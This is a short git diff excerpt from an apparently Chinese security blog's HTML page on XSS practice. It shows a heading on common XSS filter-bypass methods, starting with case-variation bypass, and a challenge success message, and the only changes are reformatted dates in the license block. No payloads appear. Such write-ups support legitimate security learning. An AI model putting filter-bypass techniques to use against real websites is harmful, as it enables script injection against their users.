 <h1 id="0-1XSS-绕过常用方法"><a href="#0-1XSS-绕过常用方法" class="headerlink" title="0|1XSS 绕过常用方法"></a>0|1<strong>XSS</strong> <strong>绕过常用方法</strong></h1><p><strong>1</strong> <strong>、大小写绕过</strong></p>
@@ -857,8 +853,8 @@ confirm("完成的不错！");
         <div class="license-wrapper">
             <p>原文作者：<a href="https://the-wind-hunter.github.io">jax</a>
             <p>原文链接：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/</a>
-            <p>发表日期：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">十一月 20日 2019, 11:27:52 上午</a>
-            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">November 21st 2019, 11:08:14 am</a>
+            <p>发表日期：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">November 20th 2019, 11:27:52 am</a>
+            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/11/20/XSS平台练习/XSS平台练习/">November 21st 2019, 11:20:04 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
        
